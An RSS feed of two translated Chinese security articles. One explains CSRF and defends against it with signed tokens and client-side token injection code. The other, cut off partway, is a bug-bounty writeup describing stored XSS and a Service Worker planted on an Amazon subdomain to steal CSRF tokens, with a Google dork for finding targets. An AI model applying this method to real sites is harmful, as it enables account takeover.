<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>Twosecurity</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/</link>
<description>twosecurity.io</description>
<language>zh-cn</language>
<lastBuildDate>Wed, 25 Oct 2017 09:33:20 +0800</lastBuildDate>
<item>
<title>Wiping Out CSRF</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-24-30401930.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Wiping Out CSRF&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30401930&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;现在是2017年了，关于跨站请求伪造（CSRF）已经没有多少可以说的了。这是一个被熟知了多年的漏洞，在现在流行的 web 框架上也得到了一定的解决。那么为什么我们还在谈论呢？有几个原因：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;传统的应用程序缺乏 CSRF 保护机制;&lt;/li&gt;&lt;li&gt;一些框架的构建不够完善;&lt;/li&gt;&lt;li&gt;应用程序没有很好的利用具有保护机制的框架;&lt;/li&gt;&lt;li&gt;新的应用程序不使用提供 CSRF 保护机制的现代框架。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;CSRF 仍然是 Web 应用程序中普遍漏洞。 这篇文章将深入地分析 CSRF 的工作原理以及当下的一些防御对策。随后我们将提供一种解决对策，可以运用在应用程序写完之后，不需要修改源代码。最后，我们将检测 cookie 的一种新扩展，如果成为一种标准，这可能就是大多数CSRF 案列的一个终结了。代码附在这里，其中包含测试用例的具体实现。[&lt;a href=&quot;https://www.github.com/jrozner/csrf-demo&quot;&gt;GitHub存储库&lt;/a&gt;] &lt;/p&gt;&lt;h2&gt;&lt;b&gt;理解攻击 &lt;/b&gt; &lt;/h2&gt;&lt;p&gt;在最根本的层面上，CSRF 是一个漏洞，攻击者强制受害者代表攻击者发出 HTTP 请求。这是一种完全发生在客户端的攻击（例如 Web 浏览器），其中接收方相信受害者正在发送可信任的应用程序信息。有三个组件能够发生攻击：不正确的使用危险的HTTP请求方式，Web浏览器对cookie的处理和跨站脚本攻击（XSS）。 HTTP  规范标准将请求方式分为安全的和不安全的两种。安全的请求方式（GET，HEAD 和 OPTIONS）旨在用于只读操作。使用它们的请求旨在返回有关所请求的资源的信息，并且不会对服务器产生任何副作用。不安全动词（POST，PUT，PATCH 和 DELETE）用于修改，创建或删除资源。不幸的是，HTTP 请求的的方式可能被忽略，或者是请求的意图没有被严格的限制。 不正确的请求方式使用的主要原因是由于 HTTP 规范的浏览器支持率历来较差。直到 XML  HTTP 请求（XHR）的流行，除了 GET 或 POST 之外，根本不可能使用不依赖于特定框架和库黑客的动词。这种限制导致区分 HTTP 请求方式变的实际无关紧要。仅仅这样做不足以创造 CSRF 的条件，但它有助于并使其保护更加困难。导致 CSRF 漏洞的最大因素是浏览器处理 Cookie 。 HTTP 最初被设计为无状态协议，具有对应于单个响应的单个请求，并且在请求之间不携带状态。为了支持复杂的Web 应用程序，创建 Cookie 作为在相关 HTTP 请求之间保持状态的解决方案。Cookie 驻留在浏览器的全局级别，并在实例，窗口和标签之间共享。用户依赖于网页浏览器，可以自动传送每个请求的 Cookie 。由于 cookie 可以在浏览器中访问/修改，并且没有防篡改保护，所以状态的存储已经转移到服务器管理的 session 中。在该模型中，在服务器上生成唯一的标识符并将其存储在 cookie 中。每个浏览器请求都会发送 cookie ，并且服务器能够查找该标识符，以确定它是否是一个有效的会话。会话结束时，服务器就不记得这个标识符了，之前发送的请求也将会失效。 问题在于浏览器是如何管理 cookie 的。一个 cookie 由几个属性组成，但我们关心的最重要的一个是 Domain 属性。Domain 属性的预期功能是将 Cookie 定位到与 cookie的 domain 属性相匹配的特定主机。这被设计为一种安全机制，以避免敏感信息（如会话标识符）被攻击者可能执行会话固定攻击的恶意网站被盗。这里的缺点是 domain 属性不依赖于同源策略（SOP）; 它只是将 Cookie 的 domain 的值与请求中的主机进行比较。这允许源自不同来源的请求也携带该主机的任何 cookie 。当且仅当安全和不安全的请求方式被正确使用时，这是安全的行为; 示例：安全请求（GET）不应该改变状态，但是我们已经看到正确的使用不一定值得信任。如果您不了解 SOP，那么您应该&lt;a href=&quot;https://en.wikipedia.org/wiki/Same-origin_policy&quot;&gt;阅读更多信息&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;最重要的组件是跨站脚本攻击（XSS）。XSS 是受害者在 DOM 中呈现攻击者控制的JavaScript 或 HTML 的能力。如果 XSS 存在于应用程序中，那么在阻止 CSRF 攻击时它也就结束了。如果 XSS 是有效的，我们将在本文中讨论的主要对策，大多数应用程序依赖，可以被绕过的。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;进行攻击  &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;现在我们知道这些因素，让我们深入了解 CSRF 的工作原理。如果您尚未设置，现在将是遵循代码库中的说明并获取示例运行的好时机。README 中提供了基本设置的说明，以及入门指南。 我们将介绍三种传统的不同类型的 CSRF： &lt;/p&gt;&lt;p&gt;1.资源包含 &lt;/p&gt;&lt;p&gt;2.基于表单 &lt;/p&gt;&lt;p&gt;3.XMLHttpRequest &lt;/p&gt;&lt;p&gt;资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如图像，音频，视频，对象，脚本等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。 由于缺少对 Cookie的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。 &lt;/p&gt;&lt;p&gt;我们将讨论的第二种类型是基于表单的 CSRF，通常在正确使用安全的请求方式时看到。攻击者创建自己的表单，模仿他们想要受害者提交的表单; 它包含一个 JavaScript 片段，强制受害者的浏览器提交表单。该表单可以完全由隐藏的元素组成，并且表单应该迅速地提交，以致受害者不能发现它。由于处理 cookies，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。  &lt;/p&gt;&lt;p&gt;我们将讨论的最后一个主要类型是 XMLHttpRequest（XHR）。由于需求的需要，这可能是最不可能看到的。由于许多现代 Web 应用程序依赖 XHR，我们将花费大量的时间来构建和实现这一特定的对策。基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略（CORS），XHR 仅限于攻击者托管自己的有效载荷的原始请求。这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器 DOM 的方式。 &lt;/p&gt;&lt;p&gt;以下解决方案是可以用于实际部署的极大简化。它主要侧重于客户端和 token 管理。对请求和响应的拦截和修改有许多奇怪的边缘情况，需要大量关于本身运行平台的知识。理解平台的复杂性有很大的权衡，以避免理解和处理 CSRF 本身的复杂性。理想情况下，最好的解决方案是使用一个框架来提供内置和利用 CSRF 保护的框架。尽管有免责声明，但仍然存在许多理由，如下所述的解决方案是有道理的。  &lt;/p&gt;&lt;h2&gt;&lt;b&gt;现代防御 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;有许多例子都证明不可能修改应用程序来实现 CSRF 的防护。一方面源代码无法得到，另一方面修改应用程序的风险太高，或者由于应用程序的限制不容易完成。该解决方案特别适合部署在 RASP、WAF、反向代理或负载平衡器中，并且可用于为单个应用程序提供保护，或者使用相同配置的所有应用程序。当部署平台被理解得很好但是应用程序不被适用时，这是特别有用的。我们来讨论通常用于防范 CSRF 的现有解决方案，以及如何根据上述要求构建它们。  &lt;/p&gt;&lt;p&gt;首先，正确使用安全和不安全的 HTTP 请求方式很重要。这一点不是一个有效的解决方案，但它会使一切变得更加容易，接下来的两种方法取决于它。不幸的是，没有一个可以在事实之后应用的解决方案。这是在构建应用程序时需要做的，需要设计和架构。幸运的是，大多数现代Web 框架都有一个路由器的概念，它强制要求有个与 HTTP 请求方式配对的终端。在现代框架中，对与终端不匹配的请求会导致错误。如果这是您的应用程序无法实现的，我们稍后将讨论解决方法。  &lt;/p&gt;&lt;p&gt;下一个保护是验证请求的来源。该对策旨在确保进入应用程序的请求源自应用程序内的（或具有 CORS 的其他可信来源）。正确的请求方式很重要，因为只要我们假设只有状态改变的请求是不安全的，那么我们只需要验证不安全请求的来源。由于我们上面讨论的问题，验证安全请求的来源是有问题的。如果需要，那么一个解决方案是创建一个已知安全网址的排除列表，例如用户首次访问时将要访问的主页或可能的着陆页。这将防止外部来源的 CSRF，但允许用户到达网站的期望行为，并在首次访问时保持登录状态。 &lt;/p&gt;&lt;p&gt;这种保护并不是绝对必要的，但它增加了额外的层次，并且可能是您要使用 CORS 的一种解决方案。由于应用程序中的 SOP 和 token 的分配，CORS 使 token 的实现变得格外困难。源验证还取决于 HTTP 头的存在，但由于浏览器差异，浏览器扩展或某些请求条件而可能不存在的 HTTP 头。如果请求头缺少，则默认选项应始终是打开失败，并依赖不同层的解决方案来减轻 CSRF 。 &lt;/p&gt;&lt;p&gt;该保护通过将 Origin 或 Referer 头与请求中的 Host 头进行比较来起作用。Origin 标头仅在某些情况下使用，例如 XHR，并且可能不存在于所有请求中。它由完整的主机组成，包括端口。Referer 头显得更为常见，是发出请求时浏览器地址栏的完整URL。最后，Host 头是浏览器通知主机的服务器，包括端口（如果不是80），希望与之通信。这需要在单个应用服务器上支持虚拟主机或多个站点。在这种情况下，我们使用 Host 头作为比较的真实来源，因为我们知道 Host 头将对应于我们要强制进行原始检查的主机。首先检查 Origin头，然后检 Referer。这个顺序并不重要，甚至可以交换。需要一些基本的解析，并且确保只比较主机和端口，这一点非常重要。 &lt;/p&gt;&lt;p&gt;您可能会想知道的是，鉴于 Referer 欺骗的可能性和易用性，比较 referer 是否可信。有两个部分使这无关紧要。第一个是 Referer 欺骗的唯一方法是直接来自受害者。如前所述，这完全是客户端攻击，所以受害者的浏览器必须有意地伪造 Referer 来绕过检查。这是不太可能故意发生的事情。第二个因素是这些 Headers，Origin 和 Referer 不能被 JavaScript 设置，因为它们受到保护，并且如果攻击者的 XSS 有效负载尝试设置它们将导致错误。这也限制了任何对受害者浏览器上这些头的修改，假设用户永远不会故意去自己攻击自己、浏览器也正常工作，这或许是安全的。  &lt;/p&gt;&lt;p&gt;第三个也是最常用的对策是 token。token 有几个不同的种类，但是每种实现最终都使用同步token。要更完整的了解，您应该阅读“双重提交” tokens 和“加密” tokens。尽管此处讨论的解决方案较简单，但双重提交令牌应可用于以下解决方案，而加密令牌通常由于 AES 或其他选择的加密方案的成本而不太有效。相反，我们将使用同步器和加密的混合，提供最佳的两种解决方案。  &lt;/p&gt;&lt;p&gt;同步器 tokens 通过使用唯一的 token 让服务器和浏览器同步工作。对一个安全方法的请求服务器会返回一个 token，浏览器会随着每个不安全的请求一起返回给服务器，通常在表单正文或请求头，这具体取决于请求的类型。在允许请求继续之前，服务器验证该 token 是真实的和有效的; 服务器还将提供一个新的 token，以便令牌不会持续重复使用或打开来重复攻击。由于 SOP，这将阻止攻击者控制的主机上的 CSRF 有效载荷。攻击者将无法得到 token 并将其插入到请求中，因为这样做将要求攻击者能够强制受害者向远程站点请求并返回响应 - SOP 恰恰就是被设计来阻止这个的。攻击者唯一可以利用的就是应用程序里的xss跨站脚本。 &lt;/p&gt;&lt;p&gt;token 由四部分组成，必须保持完整性才能有效。任何一个的损失将显着削弱 token 的保护。这四个部分是随机数，用户标识符，期限和真实性验证：  &lt;/p&gt;&lt;p&gt;1.随机数的关键空间大小并不是太重要，只要它足够大以确保缺少重复。 &lt;/p&gt;&lt;p&gt;2.用户标识符可以是用户唯一的任何值。在我们的实现中，我们将选择使用会话标识符。  &lt;/p&gt;&lt;p&gt;3.寿命或到期时间是 token 有效的长度。理想情况下，您希望时间足够短，以至于被盗后不能长时间使用，但长度足以使真实用户使用它时不会过期，从而导致失败的请求。在大多数框架实现中，通常将 token 保存在 session 中并且随着 session 的超期而失效。这样做只有一个值在任何一个时间都有效，在我们的情况下不是这样，所以需要离散的到期。在我们的例子中，我们会默认一个小时。 &lt;/p&gt;&lt;p&gt;4.一定有办法保证 token 是真实的，并没有被篡改或伪造。在框架内实现的解决方案通常可以通过将该值存储在用户永远无法访问的服务器端会话存储中来。在我们的例子中，我们将依靠HMAC-SHA256，并提供一个可以验证的 token 的签名。这具体是另一个原因，因为攻击者还需要获取 HMAC 的密钥以伪造令牌。如果密钥被破坏，整个 token 和密钥空间是不相关的在这种情况下，随机性只是为令牌值提供一些额外的熵，以最小化被盗或泄漏令牌的有用性。这也是我们如何避免大多数框架依赖于会话存储的需求，同时获得比大多数加密令牌解决方案有更好的性能。 &lt;/p&gt;&lt;p&gt; token的实现有两个方面，服务器端处理token的生成/验证以及客户端，客户端将token发送到服务器以获取需要的请求。除了提供生成和验证的示例之外，我们不会深入到服务器端实现中，正如之前在声明中所说，处理拦截请求/响应的具体细节因平台而异。只需说一下，深入特定平台的中间件API，并使用它来实现接近以下步骤的操作。  &lt;/p&gt;&lt;p&gt;1.当前session是否有token？如果没有，请标记应生成token。 &lt;/p&gt;&lt;p&gt;2.请求是否需要验证？如果是，验证并标记该token已被使用。 &lt;/p&gt;&lt;p&gt;3.如果需要验证并失败，那么短路响应并停止处理。如果验证成功，则处理请求。  &lt;/p&gt;&lt;p&gt;4.如果token不存在或被标记为已使用，则生成新token并将添加其cookie到响应中。  &lt;/p&gt;&lt;p&gt;值得注意的是，每次生成一个新的token，即使没有验证，也不会增加任何安全性或者打开一个新的攻击向量。如果更容易，您可以在每个请求上生成一个新的令牌来构建您的实现。您将不会获得额外的保护，但是性能损失应该可以忽略不计。token被添加到cookie中，作为一种为浏览器提供值的方式，javascript 可以访问到它，浏览器也会自动的保存它。确保 HttpOnly标志永远不会用于此 cookie 这很重要。这样做会打破实施，但是没有任何安全问题，因为唯一的威胁来自 XSS，它提供了必要的条件来绕过 CSRF 的保护。 &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;String generateToken(int userId, int key) {
 byte[16] data = random() 
 expires = time() + 3600
 raw = hex(data) + &quot;-&quot; + userId + &quot;-&quot; + expires 
 signature = hmac(sha256, raw, key) 
 return raw + &quot;-&quot; + signature 
} &lt;/code&gt;&lt;p&gt;以上是创建新 token 的简单示例。只是被连字符连接起来的四个部分。HMAC 将前三部分用于加密，以确保每个人的真实性，加密后的结果作为第四部分。选择连字符作为分隔符，因为冒号不是 Cookie 版本0 Cookie 的有效字符。使用它必须要升级到版本1，这可能会破坏与旧浏览器的一些兼容性。 &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;bool validateToken(token, user) { 
parts = token.split(&quot;-&quot;) 
str = parts[0] + &quot;-&quot; + parts[1] + &quot;-&quot; + parts[2] 
generated = hmac(sha256, str, key) 
if !constantCompare(generated, parts[3]) { 
   return false
 } 
if parts[2] &amp;lt; time() {
    return false 
} 
if parts[1] != user {
      return false
} 
  return true 
}  &lt;/code&gt;&lt;p&gt;上面的代码块是一个验证 token 并计算有效性的简单示例。token 被分为四个部分，第一步是通过前三个部分重新生成 HMAC 并将其与期望的 HMAC 进行比较来验证 HMAC 。确保在这里使用一个恒定的时间来避免引入任何时序攻击。如果成功，我们验证token是否过期，用户是否匹配。从根本上来说这就是生成和检验 token 的流程。真正的威胁是用户的浏览器自动提交请求时也带上了 token。  &lt;/p&gt;&lt;p&gt;大多数现代框架在构建应用程序时都会为您考虑到了这一点。他们有库函数来处理 XHR，将token 插入到请求和模板助手中，以便将当前 token 包含在表单中。这是我们要模仿的功能：不依赖于框架为我们提供。相反，作为我们回应拦截的一部分，我们将在响应中添加或附加一小段 JavaScript。尽管严格测试绝对不符合规范，但几乎每个浏览器都将正确处理脚本标签，JavaScript 中分别添加或附加到打开或关闭 HTML 标签。我们将专门针对 HTML contentType的响应，以确保我们只将注入到我们不会中断的响应中，我们只修改非 XHR 的响应。这将避免我们将脚本多次加载到浏览器或 JSON 响应中。 &lt;/p&gt;&lt;p&gt;实现这一点有两个部分，一个是处理表单提交，另一个是处理 XHR 。第一个代码段是附加到onclick 事件的文档回调最小化版本。将它附加到文档而不是尝试附加到单个表单或可点击元素很重要，因为在附加时，表单或元素很可能不存在于 DOM 中，导致回调未触发。相反，我们附加到始终存在的文档，并委托给我们关心的元素。我们还需要使用 onclick 而不是onsubmit，因为 onsubmit 在所有浏览器和版本中都不会浮动，这意味着我们无法附加到文档并被调用。  &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;var target = evt.target; 
while (target !== null) { 
  if (target.nodeName === &#39;A&#39; || target.nodeName === &#39;INPUT&#39; || 
      target.nodeName === &#39;BUTTON&#39;) {
        break; 
     } 
     target = target.parentNode; 
   } // We didn&#39;t find any of the delegates, bail out 
if (target === null) { 
 return; 
} &lt;/code&gt;&lt;p&gt;第一节抓取被触发事件的目标元素。这是用户点击的元素。由于 DOM 的树结构和事件冒泡系统，这个元素可能不是我们感兴趣的元素，而是我们必须走出 DOM 寻找可以提交表单的元素; 在这种情况下，比如：&amp;lt;a&amp;gt;、&amp;lt;input&amp;gt; 或 &amp;lt;button&amp;gt; 标签。如果我们在发现一个 DOM 之前到达 DOM 的顶端，那么就轻松了，因为它是一个没有提交表单的元素上的点击事件。  &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// If it&#39;s an input element make sure it&#39;s of type submit 
var type = target.getAttribute(&#39;type&#39;); 
if (target.nodeName === &#39;INPUT&#39; &amp;amp;&amp;amp; (type === null || !type.match(/^submit$/i))) { 
   return; 
   } // Walk up the DOM to find the form var form; 
for (var node = target; node !== null; node = node.parentNode) { 
    if (node.nodeName === &#39;FORM&#39;) { 
        form = node; break; 
                                     } 
  } if (form === undefined) { 
  return; 
} &lt;/code&gt;&lt;p&gt;接下来我们检查标签是否是 &amp;lt;input&amp;gt; 。如果是，那么我们要确保它是一个提交按钮。否则它不会提交表单 , 而只是使浏览器关注元素。一旦我们确定目标导致提交事件的发生，那么继续从DOM 中寻找一个表单标签。如果我们到达 DOM 的顶端，但没有找到一个表单标签，那么该元素不会被提交，除非它使用 XHR，这将被 XHR 相关代码部分处理。 &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;var token = form.querySelector(&#39;input[name=&quot;csrf_token&quot;]&#39;); 
var tokenValue = getCookieValue(&#39;CSRF-TOKEN&#39;); 
if (token !== undefined &amp;amp;&amp;amp; token !== null) { if (token.value !== tokenValue) { 
     token.value = tokenValue; 
} 
  return; 
} 
var newToken = document.createElement(&#39;input&#39;); 
newToken.setAttribute(&#39;type&#39;, &#39;hidden&#39;); 
newToken.setAttribute(&#39;name&#39;, &#39;csrf_token&#39;); 
newToken.setAttribute(&#39;value&#39;, tokenValue); 
form.appendChild(newToken); &lt;/code&gt;&lt;p&gt;一旦找到表单，剩下的唯一步骤就是把这个 token 添加到 form 中作为一个隐藏的输入元素。第一步是从先前的提交中检查元素是否已经存在。如果是，请检查该值，并在必要时进行更改。如果没有，则创建一个新元素并将其附加到表单中。由于冒泡的作用方式，此处理程序在提交表单之前触发，并在处理程序返回之前将元素添加到表单中，导致浏览器提交的请求带有表单中的新元素，然后将token添加到正文的请求。 对于非基于表单的请求，需要一种将token存入 XHR 请求的方法。大多数库都提供抽象方法，包括 jQuery，这使得这更容易，因为它们提供了可以修改请求的回调函数，允许不同的请求。不幸的是，我们不能假设一个特定的库将会出现，并且需要为标准的 XHR API 创建我们自己的 hook。为了做到这一点，我们将包装和修补对象本身以添加额外的功能。 &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;XMLHttpRequest.prototype._send = XMLHttpRequest.prototype.send;   XMLHttpRequest.prototype.send = function（）{ 
 if（！this.isRequestHeaderSet（&#39;X-Requested-With&#39;））{ 
 this.setRequestHeader（&#39;X-Requested-With&#39;，&#39;XMLHttpRequest&#39;）; 
} 
var tokenValue = getCookieValue（&#39;CSRF-TOKEN&#39;）;
 if（tokenValue！== null）{
 this.setRequestHeader（&#39;X-CSRF-Header&#39;，tokenValue）;
} 
this._send.apply（this，arguments）; 
}; &lt;/code&gt;&lt;p&gt;通过利用 JavaScript 的原型继承和动态性质，我们将原始发送方法的副本保存到对象上，以便我们可以保留对其的引用以供稍后使用。然后，我们创建一个附加到发送原型的新函数，该原型从 cookie 中提取 token，并向请求中添加一个带有值的 header 。真正的发送方法通过保存的 referer 来调用，原始参数通过它们按预期工作。就浏览器中的代码而言，认为 API 没有改变，XHR 对象也并没有不同，但是我们现在强制所有请求都在服务器可以读取的 header 中提交一个 CSRF token。 这个实现的一个特别的注意事项是，由于原型支持和 XHR 可用性，它只能用于 Internet Explorer（IE）8。XHR 被引入 Internet Explorer 7，但是不存在正确的原型支持，需要额外的解决方案来完善此功能。至少 IE6 可以使用基于表单的解决方案。可能有一种方法可以通过自定义的 ActiveX 控件为旧版本的IE版本添加额外的支持，但不在本文的范围之内。处理旧版本浏览器缺乏支持的另一个解决方案是简单地不执行 CSRF 检查，而是检查用户代理头。尽管如此，这些可能并不总是存在并且可能被伪造，这样做将需要受害者主动地忽略安全性问题或已经被恶意软件或 XSS 攻击而泄密。所有其他浏览器似乎都有很好的支持，如下图所示。上面的代码可能会被比以下版本更老的浏览器支持，但是，查找测试副本很难，这些版本的浏览器也覆盖了大多数人常用的。 &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bf361cde736992b907623bcaa84b5e74_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;315&quot;&gt;&lt;h2&gt;&lt;b&gt;关于未来 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;现在我们已经根据当前的实践构建了涵盖一个适用于旧版本浏览器到现代浏览器的解决方案，现在是时候来看看一个新的解决方案，这可能是大多数CSRF案例的完结了。这是一种扩展名为 Same-Site 的 Cookie 的扩展形式，它增加了对 Cookie 源的检查。Same-Site 允许浏览器限制只发送来自与域匹配的主机的请求发送的 cookie，大大地取代了对同步器令牌的需求。有两种形式，strict 和 lax。strict 会检查所有安全和不安全的请求，而 lax 只支持检查不安全的请求。大多数应用程序将需要配置为 lax，因为保护安全请求就不允许将会话 cookie 与原始 GET 请求一起发送到站点。 在撰写本文时，浏览器支持非常之少，主要是 Chrome 支持该功能。下表列出了从&lt;a href=&quot;https://www.caniuse.com&quot;&gt;这里&lt;/a&gt;得到的信息。但是，作为扩展程序，Same-Site不会破坏不支持旧浏览器对 Cookie 的兼容性。较老的浏览器将会自动忽略此项 功能。 &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-78c29c936a5566f150bffe4a391cace8_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;357&quot;&gt;&lt;p&gt;在撰写本文时，Same-Site 还只是以草案存在，我不知道有任何可以支持这种功能的 Cookie库。只有这种方式变得更稳定和被多数人接受，才可能像token一样地使用。它可以与同步器token 结合使用，以支持较旧和较旧的浏览器。Same-Site 的一个缺点是缺乏 CORS 支持。在撰写本文时，没有提及添加对白名单特定来源的支持，以安全地发送 cookies。这将会破坏依赖于向服务器提供状态信息的 Cookie 的 CORS 请求。一个潜在的解决方法是删除仅用于不使用 Same-Site 并执行源验证的外部站点的第二个 cookie&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;参考：&lt;a href=&quot;https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f&quot;&gt;https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-24-30401930</guid>
<pubDate>Tue, 24 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>使用 Service Worker API窃取 Amazon 的CSRF Tokens</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-17-30214540.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;使用 Service Worker API窃取 Amazon 的CSRF Tokens&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30214540&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;大家好，今天我有空闲时间，我想给你们分享我在 Amazon 的发现，这个问题可能会导致你的的 Amazon 帐户被完全控制。&lt;/p&gt;&lt;h2&gt;介绍&lt;/h2&gt;&lt;p&gt;首先,让我们来简单谈谈 Amazon ——世界最大的电子商业门户(电子商业即意味着大量资产的聚集），他拥有远超于34万的雇员。如此庞大的工作人群就导致网站面临十分严峻的安全问题，于是 Amazon 创建了一个网站来供用户反馈安全问题（对提交者没有任何奖赏），这也就是我今天漫长故事的缘由——它会报告安全问题给安全团队来修复，使产品更加安全，但是提交者却什么也得不到，甚至没有一点声望奖励，比如设置名人堂或者哪怕是一件文化衬衫。&lt;br&gt;&lt;/p&gt;&lt;p&gt;近些天来我没有花很多时间去寻找漏洞，但是当我发现漏洞时，我会将所有时间和精力都投入进去，确保构造一个完美的 &lt;b&gt;PoC&lt;/b&gt; (Proof of Concept 观点验证程序，通过执行程序来达到预期的结果)去书写报告，这不是一个策略性的攻击，而是一个很好的服务器端漏洞。&lt;br&gt;&lt;/p&gt;&lt;p&gt;当我发现下面这个有趣的漏洞的时候，我正忙于私人漏洞悬赏项目。悬赏方使用了名为 Answerhub 的第三方服务，如果你在之前看过我的blog，你就会发现我已经在这个服务上发现过漏洞，所以不可能找不到新漏洞。因为我已经找到我以前的发现，你可以在这里阅读 &lt;a href=&quot;http://link.zhihu.com/?target=https%3A//ahussam.me/how-i-hacked-oculus-oauth-ebay-ibm/&quot;&gt;How&lt;/a&gt; &lt;a href=&quot;http://link.zhihu.com/?target=https%3A//ahussam.me/how-i-hacked-oculus-oauth-ebay-ibm/&quot;&gt;I&lt;/a&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//ahussam.me/how-i-hacked-oculus-oauth-ebay-ibm/&quot;&gt;Hacked Oculus OAuth +Ebay +IBM&lt;/a&gt;。于是,我开始在上传功能方面寻找突破。&lt;br&gt;&lt;/p&gt;&lt;p&gt;我很清楚我需要的是什么，所以没有花太多时间在没有用的东西上。在漏洞报告中，我直接使用文件上传来创建存储型的XSS。这个域名本身是超范围（指这个域名不在 FaceBook的漏洞奖励域名范围内)的,但是我构造了JS攻击代码,完成了对另外一个在范围内域名的攻击，为此，他们给了我1250美元的报酬。&lt;br&gt;&lt;/p&gt;&lt;p&gt;同时，我发现亚马逊也在使用相同的第三方服务（AnswerHub），鉴于 amazon crossdomain.xml策略的宽松，我衍生了一个想法，如果我能找到一种方式来上传SWF文件到amazon子域，我就可以从主域窃取数据。不过它不允许上传flash内容。现在我们开始有趣的部分，结束无聊的介绍。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;技术细节&lt;/h2&gt;&lt;p&gt;这一小节的标题很吸引人，你们许多人会为了仅仅了解这样一种方法选择跳至此段，而并不是对我所讲述的故事感兴趣。那么你们今天相当幸运，我会把你们所想知道的一切告诉你们。&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先，寻找一些正在使用 AnswerHub 服务的大公司&lt;br&gt;&lt;/p&gt;&lt;p&gt;通过使用 Google dork 搜索语法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;inurl：/questions/ask.html 
inurl：https：//
&lt;/code&gt;&lt;p&gt;我得到了很多满意的结果，经过一些筛选。当我看到 Amazon的字样后，查看crossdomain.xml 的想法立马从我脑袋里就跳了出来，那么就让我们来尝试一下。&lt;/p&gt;&lt;p&gt;这是 Amazon的 crossdomain.xml：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-a2fec87a2dbfdd85d1d102bc1262acf2_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;592&quot; data-rawheight=&quot;502&quot;&gt;&lt;p&gt;我的目标是 &lt;a href=&quot;http://link.zhihu.com/?target=http%3A//gamedev.amazon.com&quot;&gt;http://gamedev.amazon.com&lt;/a&gt;，我能够上传 XML文件( SVG)，这可能造成存储型 XSS，但这不是我想要的,所以我尝试了所有我知道的技巧来上传 SWF文件，但都无济于事&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Thinking outside the box&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我没有发现 swf 上传有任何问题 , 我一直在思考 我已经有的 XSS漏洞。然后我想到了一个好主意，通过同时上传 SVG文件和 JS文件来触发这个域上的 Service Worker！&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Service Worker API（Google Chrome）&lt;/b&gt;：&lt;/p&gt;&lt;blockquote&gt;&lt;i&gt;A service worker is a&lt;br&gt;script that your browser runs in the background, separate from a web page,&lt;br&gt;opening the door to features that don’t need a web page or user interaction.&lt;br&gt;Today, they already include features like push notifications and background&lt;br&gt;sync. In the future, service workers will support other things like periodic&lt;br&gt;sync or geofencing. The core feature discussed in this tutorial is the ability&lt;br&gt;to intercept and handle network requests, including programmatically managing a&lt;br&gt;cache of responses.&lt;/i&gt;&lt;/blockquote&gt;&lt;p&gt;( Service Worker是一种浏览器在后台运行的脚本，与网页分开，为不需要的网页和用户交互的功能打开了大门。它的核心功能是拦截和处理网络请求的能力，包括以编程方式管理响应缓存。如今，他们已经包括推送通知和后台同步等功能。并且在未来，Service 